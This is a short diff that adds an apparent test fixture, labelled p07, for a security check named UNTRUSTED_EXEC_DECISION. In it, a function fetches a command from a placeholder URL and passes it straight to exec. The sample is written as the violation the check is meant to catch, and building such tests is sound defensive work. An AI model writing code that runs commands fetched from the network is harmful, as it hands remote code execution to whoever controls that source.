@@ -1,0 +1,6 @@
+// p07 — Promise attacked: "What it stops" / UNTRUSTED_EXEC_DECISION — network data steering a command
+pattern Sync() -> String {
+  let cmd = http_get("http://example.com/cmd")
+  let _ = exec(cmd)
+  return "done"
+}
